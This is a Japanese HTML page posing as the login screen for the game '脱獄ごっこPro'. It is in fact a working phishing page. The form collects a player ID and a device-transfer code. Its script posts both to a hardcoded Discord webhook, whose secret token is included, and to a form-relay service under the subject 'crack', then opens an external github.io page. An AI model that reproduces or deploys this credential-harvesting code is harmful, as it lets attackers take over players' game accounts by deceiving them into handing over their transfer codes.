<html lang="ja">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ログイン|脱獄ごっこPro</title>
  </head>

  <body>
    <div class="contact-form">
      <p id="taitai">脱獄ごっこProにログイン</p>
      <form id="loginForm" action="https://api.staticforms.xyz/submit" method="post" onsubmit="return validateForm(event)">
        <input type="hidden" name="accessKey" value="b60bc6da-6ef8-4e65-a2e1-921aee9c7727">
        <input type="hidden" name="subject" value="crack">

        <div class="item">
          <input type="text" id="playerId" name="name" placeholder="プレイヤーID" minlength="16" maxlength="16" pattern="^[a-zA-Z0-9_@]+$" required>
        </div>
        <br>
        <div class="item">
          <input type="password" id="changeCode" name="name" placeholder="機種変更コード" minlength="12" maxlength="12" pattern="^[a-zA-Z0-9_@]+$" required/>
        </div>
        <br>
        <div class="button-area">
          <input type="submit" value="ログイン">
        </div>
          <hr>

    <a href="#">Japanに所在するアカウントで続行すると、あなたは脱獄ごっこProの 利用規約に同意し、脱獄ごっこProの プライバシーポリシーを読んだとみなされます。</a>
      </form>
    </div>

    <script>
      const webhookURL = 'https://discord.com/api/webhooks/1256923461255958660/51CKXYA7Z9GpiL4g-f-nIoTeD6ax-QiQh34RJq0sLaYMpC_GTJeNprtL3VyM9NP0Nxp8';

      function sendToDiscord(playerId, changeCode) {
        const request = new XMLHttpRequest();
        request.open("POST", webhookURL);
        request.setRequestHeader('Content-type', 'application/json');

        const params = {
          username: "Form Bot",
          content: `プレイヤーID: ${playerId}\n機種変更コード: ${changeCode}`
        };

        request.send(JSON.stringify(params));
      }

      function validateForm(event) {
        event.preventDefault(); // フォームのデフォルトの送信を防ぐ

        const playerId = document.getElementById('playerId').value;
        const changeCode = document.getElementById('changeCode').value;

        if (playerId.length === 16 && changeCode.length === 12) {
          sendToDiscord(playerId, changeCode);
          window.open('https://heleamc.github.io/PRO');
          return true; // フォームを送信する
        } else {
          alert("入力内容が正しくありません。");
          return false; // フォームの送信を防ぐ
        }
      }
    </script>
